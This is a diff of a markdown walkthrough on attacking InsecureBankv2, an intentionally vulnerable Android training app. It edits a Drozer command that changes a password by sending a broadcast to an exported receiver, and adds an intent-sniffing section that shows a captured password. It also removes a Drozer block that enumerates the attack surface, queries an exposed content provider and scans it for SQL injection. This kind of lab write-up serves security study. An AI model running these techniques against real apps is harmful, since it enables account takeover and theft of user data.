@@ -100,12 +100,32 @@ So if we can create such an intent in another app, we can change the password of
 In order to save time, we can also use Drozer's `app.broadcast.send` to quickly send a broadcast without having to create an app.
 
 ```
-dz> run app.broadcast.send --action theBroadcast MyBroadCastReceiver --extra string phonenumber 1234 --extra string newpass asdf
+dz> run app.broadcast.send --action theBroadcast --extra string phonenumber 1234 --extra string newpass asdf
 ```
 
 Take a look at [this](https://hackerone.com/redirect?signature=e9b262c23bb3df8ec37850c763775bafb8b7acca&url=https%3A%2F%2Foldbam.github.io%2Fandroid%2Fsecurity%2Fandroid-vulnerabilities-insecurebank-broadcast-receivers) link.
 
 Similar example can be found in [this](https://hackerone.com/reports/289000) report.
+
+-----
+
+## Intent Sniffing and Injection
+
+Intent sniffing can be done when the application is sending broadcast intents.
+
+We can use drozer module `app.broadcast.sniff` to sniff the required intent.
+
+The action to be sniffed is `<action android:name="theBroadcast"/>`.
+
+Therefore the drozer command required will be: `dz> run app.broadcast.sniff --action theBroadcast`.
+
+But, after I run the change password functionality on my phone, drozer fails to register any broadcast intents. If anyone knows why this might be happening, do let me know.
+
+I then proceeded to use the sniffer provided in the walkthrough `~/insecure_bankv2/wip-attackercode/SniffIntents`.
+
+Once we install the app, we can call the intent using the above drozer code.
+
+`Phone Number is: 1234 and New Password is: asdf`
 
 -----
 
@@ -125,66 +145,4 @@ username=dinesh&newpassword=dinesh
 ```
 
 -----
-
-### Drozer
-
-```
-# getting attack surface
-dz> run app.package.attacksurface com.android.insecurebankv2
-Attack Surface:
-  5 activities exported
-  1 broadcast receivers exported
-  1 content providers exported
-  0 services exported
-    is debuggable
-
-# content-providers
-dz> run app.provider.info -a com.android.insecurebankv2
-Package: com.android.insecurebankv2
-  Authority: com.android.insecurebankv2.TrackUserContentProvider
-    Read Permission: null
-    Write Permission: null
-    Content Provider: com.android.insecurebankv2.TrackUserContentProvider
-    Multiprocess Allowed: False
-    Grant Uri Permissions: False
-
-# content-provider URIs
-dz> run scanner.provider.finduris -a com.android.insecurebankv2
-Scanning com.android.insecurebankv2...
-Unable to Query  content://com.android.insecurebankv2.TrackUserContentProvider/
-Unable to Query  content://com.google.android.gms.games
-Unable to Query  content://com.android.insecurebankv2.TrackUserContentProvider
-Able to Query    content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
-Able to Query    content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/
-Unable to Query  content://com.google.android.gms.games/
-
-Accessible content URIs:
-  content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
-  content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/
-
-# content-providers retrieve information
-
-dz> run app.provider.query content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/
-| id | name   |
-| 1  | dinesh |
-| 2  | dinesh |
-| 3  | dinesh |
-
-# content-provider injection
-dz> run scanner.provider.injection -a com.android.insecurebankv2
-Scanning com.android.insecurebankv2...
-Not Vulnerable:
-  content://com.android.insecurebankv2.TrackUserContentProvider/
-  content://com.google.android.gms.games
-  content://com.google.android.gms.games/
-  content://com.android.insecurebankv2.TrackUserContentProvider
-
-Injection in Projection:
-  content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
-  content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/
-
-Injection in Selection:
-  content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
-  content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/
-```
 
